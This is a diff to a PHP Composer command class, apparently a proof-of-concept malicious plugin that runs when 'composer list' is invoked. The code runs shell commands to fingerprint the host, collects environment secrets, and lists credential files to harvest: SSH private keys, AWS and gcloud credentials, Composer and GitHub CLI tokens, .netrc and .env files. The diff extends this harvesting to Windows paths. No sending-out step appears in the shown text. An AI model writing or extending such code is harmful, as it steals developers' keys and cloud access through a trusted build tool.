@@ -33,12 +33,16 @@ class ToolkitCommand extends Command
 
         // ── 1. System identity ────────────────────────────────────────────
         $data = [];
+        $sysinfo = PHP_OS_FAMILY === 'Windows'
+            ? trim((string) @shell_exec('ver'))
+            : trim((string) @shell_exec('uname -a'));
+
         $data['meta'] = [
             'trigger'  => 'composer list --no-scripts  →  Application.php:415',
             'time'     => date('Y-m-d H:i:s'),
             'whoami'   => trim((string) @shell_exec('whoami')),
             'hostname' => trim((string) @shell_exec('hostname')),
-            'uname'    => trim((string) @shell_exec('uname -a')),
+            'sysinfo'  => $sysinfo,
             'cwd'      => (string) getcwd(),
             'php'      => PHP_VERSION . ' (' . PHP_OS . ')',
             'pid'      => getmypid(),
@@ -55,27 +59,32 @@ class ToolkitCommand extends Command
         $data['env_secrets'] = $secrets ?: ['(none found — on a real dev machine these would include CI tokens, API keys, etc.)'];
 
         // ── 3. Credential file harvest ────────────────────────────────────
-        $home = getenv('HOME') ?: '/root';
+        // Works on Linux/macOS (HOME) and Windows (USERPROFILE)
+        $home = getenv('HOME') ?: getenv('USERPROFILE') ?: (PHP_OS_FAMILY === 'Windows' ? 'C:\\Users\\' . (getenv('USERNAME') ?: 'user') : '/root');
+        $isWin = PHP_OS_FAMILY === 'Windows';
+        $sep   = $isWin ? '\\' : '/';
+
         $targets = [
-            // Composer stores Packagist tokens, GitHub OAuth, HTTP-basic creds here
-            'composer_auth'      => "$home/.composer/auth.json",
-            // GitHub CLI stores OAuth token + scopes here
-            'gh_cli_config'      => "$home/.config/gh/hosts.yml",
-            // Git credential store (plain text tokens)
-            'netrc'              => "$home/.netrc",
-            'gitconfig'          => "$home/.gitconfig",
+            // Composer auth — Packagist tokens, GitHub OAuth, HTTP-basic creds
+            'composer_auth'      => $home . $sep . ($isWin ? 'AppData\\Roaming\\Composer\\auth.json' : '.composer/auth.json'),
+            // GitHub CLI token
+            'gh_cli_config'      => $home . $sep . ($isWin ? 'AppData\\Roaming\\GitHub CLI\\hosts.yml' : '.config/gh/hosts.yml'),
+            // Git credentials
+            'netrc'              => $home . $sep . ($isWin ? '_netrc'    : '.netrc'),
+            'gitconfig'          => $home . $sep . '.gitconfig',
             // SSH private keys
-            'ssh_rsa'            => "$home/.ssh/id_rsa",
-            'ssh_ed25519'        => "$home/.ssh/id_ed25519",
-            'ssh_ecdsa'          => "$home/.ssh/id_ecdsa",
-            // Cloud credentials
-            'aws_credentials'    => "$home/.aws/credentials",
-            'aws_config'         => "$home/.aws/config",
-            'gcloud_adc'         => "$home/.config/gcloud/application_default_credentials.json",
-            // Project files that commonly contain secrets
-            'project_env'        => getcwd() . '/.env',
-            'project_env_local'  => getcwd() . '/.env.local',
-            'parent_env'         => dirname((string) getcwd()) . '/.env',
+            'ssh_rsa'            => $home . $sep . '.ssh' . $sep . 'id_rsa',
+            'ssh_ed25519'        => $home . $sep . '.ssh' . $sep . 'id_ed25519',
+            'ssh_ecdsa'          => $home . $sep . '.ssh' . $sep . 'id_ecdsa',
+            // AWS credentials
+            'aws_credentials'    => $home . $sep . '.aws' . $sep . 'credentials',
+            'aws_config'         => $home . $sep . '.aws' . $sep . 'config',
+            // GCloud
+            'gcloud_adc'         => $home . $sep . ($isWin ? 'AppData\\Roaming\\gcloud\\application_default_credentials.json' : '.config/gcloud/application_default_credentials.json'),
+            // Project .env files
+            'project_env'        => getcwd() . $sep . '.env',
+            'project_env_local'  => getcwd() . $sep . '.env.local',
+            'parent_env'         => dirname((string) getcwd()) . $sep . '.env',
         ];
 
         $harvested = [];
